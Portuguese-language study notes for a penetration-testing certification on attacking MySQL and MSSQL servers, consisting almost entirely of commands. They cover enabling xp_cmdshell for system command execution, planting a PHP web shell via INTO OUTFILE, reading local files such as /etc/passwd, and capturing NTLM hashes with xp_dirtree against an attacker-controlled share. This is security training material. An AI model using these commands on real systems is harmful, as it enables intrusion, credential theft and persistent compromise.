> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/attacking-common-services/sql-databases.md).

# SQL Databases

[MySQL](https://www.mysql.com/) e [Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server/sql-server-2019) ( `MSSQL`) são sistemas de gerenciamento [de banco de dados relacional](https://en.wikipedia.org/wiki/Relational_database) que armazenam dados em tabelas, colunas e linhas. Muitos sistemas de banco de dados relacional como MSSQL e MySQL usam a [Structured Query Language](https://en.wikipedia.org/wiki/SQL) ( `SQL`) para consultar e manter o banco de dados.

* MSSQL PORT : TCP and UDP `1433`
* MySQL PORT : TCP `3306`
* **Banner Grabbing**

```sh
nmap -Pn -sV -sC -p1433 10.10.10.125
```

* **MySQL - Conectando ao SQL Server**

```sh
mysql -u julio -pPassword123 -h 10.129.20.13
```

* **Sqlcmd - Conectando ao SQL Server**

```powershell
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

* Se estivermos mirando `MSSQL`no Linux, podemos usar `sqsh`como alternativa `sqlcmd`:

```sh
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
```

* Alternativamente, podemos usar a ferramenta do Impacket com o nome `mssqlclient.py`.

```sh
mssqlclient.py -p 1433 julio@10.129.203.7
```

* Conectando-se ao servidor MSSQL a partir do Linux enquanto o mecanismo de autenticação do Windows é usado pelo servidor MSSQL.

```sh
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

* Mostrar todos os bancos de dados disponíveis no MySQL.

```sql
mysql> SHOW DATABASES;
```

* Selecione um banco de dados específico no MySQL.

```sql
mysql> USE htbusers;
```

* Mostrar todas as tabelas disponíveis no banco de dados selecionado no MySQL.

```sql
mysql> SHOW TABLES;
```

* Selecione todas as entradas disponíveis da tabela "users" no MySQL.

```sql
mysql> SELECT * FROM users;
```

* Mostrar todos os bancos de dados disponíveis no MSSQL.

```sql
sqlcmd> SELECT name FROM master.dbo.sysdatabases
```

* Selecione um banco de dados específico no MSSQL.

```sql
sqlcmd> USE htbusers
```

* Mostrar todas as tabelas disponíveis no banco de dados selecionado no MSSQL.

```sql
sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES
```

* Selecione todas as entradas disponíveis da tabela "usuários" no MSSQL.

```sql
sqlcmd> SELECT * FROM users
```

* Para permitir que opções avançadas sejam alteradas.

```sql
sqlcmd> EXECUTE sp_configure 'show advanced options', 1
```

* Para habilitar o xp\_cmdshell.

```sql
sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1
```

* Para ser usado após cada comando sp\_configure para aplicar as alterações.

```sql
sqlcmd> RECONFIGURE
```

* Execute um comando do sistema a partir do servidor MSSQL.

```sql
sqlcmd> xp_cmdshell 'whoami'
```

* Crie um arquivo usando MySQL.

```sql
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'
```

* Verifique se os privilégios de arquivo seguro estão vazios para ler arquivos armazenados localmente no sistema.

```sql
mysql> show variables like "secure_file_priv";
```

* Leia arquivos locais no MSSQL.

```sql
sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```

* Leia arquivos locais no MySQL.

```sql
mysql> select LOAD_FILE("/etc/passwd");
```

* Roubo de hash usando o `xp_dirtree`comando no MSSQL.

```sql
sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'
```

* Roubo de hash usando o `xp_subdirs`comando no MSSQL.

```sql
sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

* Identificar servidores vinculados no MSSQL.

```sql
sqlcmd> SELECT srvname, isremote FROM sysservers
```

* Identifique o usuário e seus privilégios usados ​​para a conexão remota no MSSQL.

```sql
sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```
